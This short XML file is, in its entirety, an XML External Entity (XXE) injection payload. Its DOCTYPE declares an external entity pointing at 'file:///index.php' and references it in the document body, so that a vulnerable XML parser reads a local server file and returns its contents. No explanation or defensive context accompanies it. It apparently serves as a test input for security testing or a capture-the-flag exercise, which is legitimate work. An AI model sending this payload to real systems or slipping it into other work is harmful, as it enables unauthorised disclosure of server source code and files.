<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///index.php" >]><foo>&xxe;</foo>
